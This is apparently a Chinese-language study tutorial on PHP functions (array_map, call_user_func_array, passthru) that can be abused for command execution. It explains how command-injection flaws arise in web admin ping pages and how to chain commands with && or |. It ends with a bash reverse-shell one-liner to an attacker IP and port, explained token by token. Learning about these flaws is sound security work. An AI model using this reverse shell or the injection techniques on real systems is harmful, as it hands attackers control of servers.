array_map()

基本语法

array_map() 是 PHP 中的一个函数，它用于将回调函数应用于数组中的每个元素。这个函数会返回一个新的数组，数组中的每个元素都是回调函数处理原数组对应元素的结果。

函数的基本语法如下：

php

参数说明：

  1. $callback (callable): 一个回调函数，可以是匿名函数、对象方法或者全局函数。这个回调函数将被应用于输入数组的每个元素。

  2. $array1 (array): 第一个数组，其元素将被传递给回调函数。

  3. $... (array): 可选的，可以传入多个数组作为参数。如果传入多个数组，回调函数会接收相应数量的参数，每个参数来自每个数组的相同位置。

返回值：

  • 返回一个新的数组，数组中的每个元素都是回调函数处理原数组对应元素的结果。
利用
  • 利用条件
    • 参数1可控并且参数二至少有一个值可控

call_user_func_array()

基本语法

call_user_func_array() 是 PHP 中的一个函数，它允许你调用回调函数，并且可以传递一个参数数组给这个回调函数。这个函数非常适合在你需要动态传递参数数量时使用。

函数的基本语法如下：

php

参数说明：

  1. $callback (callable): 要调用的回调函数。可以是包含函数名的字符串，或者是一个包含对象引用和方法名的数组。

  2. $param_arr (array): 一个包含参数的数组，这些参数将被传递给回调函数。

返回值：

  • 回调函数的返回值。
利用

call_user_func 把第一个参数作为回调函数调用，其余参数为回调函数的参数

call_user_func_array 调用回调函数，并把一个数组参数作为回调函数的参数

  • 利用条件
    • 要求第一个参数为危险函数
    • 第二个参数用户可控

passthru()

passthru — 执行外部程序并且显示原始输出

passthru(string $command, int &$result_code = null): ?false

同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。

漏洞防御

任意命令执行漏洞

一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口

比如常见的路由器、防火墙、入侵检测等设备的web管理页面上一般会给用户提供一个ping操作的web页面，用户从web页面输入目标IP，提交后，后台会对该IP地址进行依次ping测试，并返回测试结果。而，如果设计者在完成该功能时，没有做到严格的安全控制，则可能会导致攻击者通过该接口提交恶意命令，从而让后台进行执行，控制整个后台服务器

危害

  1. 继承Web服务器程序的权限，去执行系统命令
  2. 继承Web服务器程序的权限，读写文件
  3. 执行命令，反弹shell

利用

我们能够控制的点是程序的整个参数，我们可以直接用&&或|等等，利用与、或、管道命令来执行其他命令

目标服务器上执行，注意编码

bash -i >& /dev/tcp/<ip>/8888 0>&1

  • bash -i:

    • bash: 调用 Bash shell。
    • -i: 使 Bash shell 进入交互模式，即打开一个交互式的终端。

  • >& /dev/tcp/<ip>/8888:

    • >: 重定向标准输出。
    • /dev/tcp/<ip>/8888: 一个特殊的设备文件，表示连接到 IP 地址为 <ip>，端口为 8888 的 TCP 服务器。
    • &: 将标准输出的文件描述符与 /dev/tcp/<ip>/8888 关联起来。
    • 因此，这部分的意思是将 Bash 的标准输出重定向到指定的 TCP 连接上。

  • 0>&1:

    • 0: 标准输入。
    • &: 将标准输入的文件描述符与标准输出的文件描述符关联起来。
    • 1: 标准输出。
    • 因此，这部分的意思是将标准输入也重定向到标准输出，即输入和输出都通过同一个 TCP 连接。
